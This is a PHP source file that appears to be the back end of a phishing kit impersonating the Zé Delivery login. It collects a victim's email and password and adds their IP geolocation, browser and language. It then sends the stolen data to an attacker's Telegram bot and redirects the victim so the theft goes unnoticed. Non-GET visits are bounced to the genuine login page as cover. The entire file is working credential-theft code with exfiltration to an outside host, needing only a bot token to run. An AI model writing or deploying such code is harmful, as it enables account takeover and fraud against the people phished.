<?php

function getIpInfo($ip) {
    $apiUrl = "http://ip-api.com/json/{$ip}";
    $apiData = file_get_contents($apiUrl);
    return json_decode($apiData, true);
}

if ($_SERVER["REQUEST_METHOD"] == "GET") {
    
    if (isset($_GET['email']) && isset($_GET['password'])) {
        
        $dataHora = date('Y-m-d H:i:s');

        $ip = $_SERVER['REMOTE_ADDR'];
        $userAgent = $_SERVER['HTTP_USER_AGENT'];
        $linguao = isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? $_SERVER['HTTP_ACCEPT_LANGUAGE'] : 'N/A';

        function getBrowserName($userAgent) {
            $browser = "Desconhecido";
            if (preg_match('/Firefox/i', $userAgent)) {
                $browser = 'Firefox';
            } elseif (preg_match('/MSIE/i', $userAgent) || preg_match('/Trident/i', $userAgent)) {
                $browser = 'Internet Explorer';
            } elseif (preg_match('/Edge/i', $userAgent)) {
                $browser = 'Microsoft Edge';
            } elseif (preg_match('/Chrome/i', $userAgent)) {
                $browser = 'Google Chrome';
            } elseif (preg_match('/Safari/i', $userAgent)) {
                $browser = 'Safari';
            } elseif (preg_match('/Opera|OPR/i', $userAgent)) {
                $browser = 'Opera';
            }
            return $browser;
        }

        $navegador = getBrowserName($userAgent);

        $ipInfo = getIpInfo($ip);

        $conteudo = "🦆 | LOG DUCKETTSTONE\n\n";
        $conteudo .= "📩 | EMAIL: " . $_GET['email'] . "\n";
        $conteudo .= "🔐 | SENHA: " . $_GET['password'] . "\n\n";
        $conteudo .= "🏠 | IP: " . $ipInfo["query"] . "\n🔎 | Cidade: " . $ipInfo["city"] . "\n📍 | Região: " . $ipInfo["regionName"] . "\n🌎 | País: " . $ipInfo["country"] . "\n📦 | ISP: " . $ipInfo["isp"] . "\n\n";
        $conteudo .= "🔓 | USER-AGENT: $userAgent\n";
        $conteudo .= "🌐 | NAVEGADOR: $navegador\n";
        $conteudo .= "👥 | LINGUAGEM: $linguao\n";
        $conteudo .= "📆 | DATA/HORA: $dataHora\n\n";        

        $botToken = 'SEU_TOKEN_BOT_TELEGRAM_AQUI_FI_DE_DEUS';
        
        $chatId = 'ID_AMIGAO';

        $mensagem = urlencode($conteudo);

        $url = "https://api.telegram.org/bot{$botToken}/sendMessage?chat_id={$chatId}&text={$mensagem}";

        $response = file_get_contents($url);

        if ($response !== false) {
            
            header('Location: inicio.html');
            exit();
        } else {
            
            echo "Esqueceu alguma coisa senhor(a) revise tudo.";
        }
    } else {
       
        echo "200";
    }
} else {
    header('Location: https://www.ze.delivery/conta/entrar');
    exit();
}
?>